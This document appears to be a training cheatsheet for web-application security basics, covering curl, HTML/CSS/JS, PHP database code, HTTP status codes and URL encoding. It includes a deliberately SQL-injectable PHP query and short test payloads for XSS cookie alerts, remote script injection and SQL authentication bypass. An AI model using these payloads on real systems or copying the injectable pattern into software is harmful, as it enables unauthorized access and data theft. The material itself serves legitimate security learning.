# Web Application Security Commands Cheatsheet

## HTTP Requests & Testing

### cURL Commands
```bash
# Get HTTP headers only
curl -I https://academy.hackthebox.com

# Get full webpage source
curl https://academy.hackthebox.com
```

### Browser Shortcuts
```
# View page source
Ctrl + U

# Right-click alternative when disabled
Right-click → View Page Source
```

## Code Examples Referenced

### HTML Structure
```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1>A Heading</h1>
        <p>A Paragraph</p>
    </body>
</html>
```

### CSS Styling
```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}
```

### JavaScript DOM Manipulation
```javascript
document.getElementById("button1").innerHTML = "Changed Text!";
```

### PHP Database Connection
```php
# Connect to MySQL
$conn = new mysqli("localhost", "user", "pass");

# Create database
$sql = "CREATE DATABASE database1";
$conn->query($sql)

# Connect to specific database
$conn = new mysqli("localhost", "user", "pass", "database1");
$query = "select * from table_1";
$result = $conn->query($query);

# User input query (vulnerable example)
$searchInput =  $_POST['findUser'];
$query = "select * from users where name like '%$searchInput%'";
$result = $conn->query($query);
```

## Testing Payloads

### HTML Injection Test
```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

### XSS Test Payload
```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

### CSRF Script Loading
```html
"><script src=//www.example.com/exploit.js></script>
```

### Authentication Bypass
```
# SQL injection for auth bypass
Email field: ' or 0=0 #
Password: any_password
```

## HTTP Response Codes Reference

### Successful Responses
- `200 OK` - Request succeeded

### Redirection Messages
- `301 Moved Permanently` - URL changed permanently
- `302 Found` - URL changed temporarily

### Client Error Responses
- `400 Bad Request` - Invalid syntax
- `401 Unauthorized` - Unauthenticated attempt
- `403 Forbidden` - No access rights
- `404 Not Found` - Resource not found
- `405 Method Not Allowed` - Method disabled
- `408 Request Timeout` - Connection timeout

### Server Error Responses
- `500 Internal Server Error` - Server encountered unknown situation
- `502 Bad Gateway` - Invalid response from gateway
- `504 Gateway Timeout` - Gateway timeout

## URL Encoding Reference

| Character | Encoding |
|-----------|----------|
| space     | %20      |
| !         | %21      |
| "         | %22      |
| #         | %23      |
| $         | %24      |
| %         | %25      |
| &         | %26      |
| '         | %27      |
| (         | %28      |
| )         | %29      |

## SOAP Example Structure
```xml
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.example.com/soap/soap/" soap:encodingStyle="http://www.w3.org/soap/soap-encoding">
<soap:Header>
</soap:Header>
<soap:Body>
  <soap:Fault>
  </soap:Fault>
</soap:Body>
</soap:Envelope>
```

## JSON REST API Response Example
```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  }
}
```

## Common Technology Stacks

- **LAMP**: Linux, Apache, MySQL, PHP
- **WAMP**: Windows, Apache, MySQL, PHP
- **WINS**: Windows, IIS, .NET, SQL Server
- **MAMP**: macOS, Apache, MySQL, PHP
- **XAMPP**: Cross-Platform, Apache, MySQL, PHP/PERL
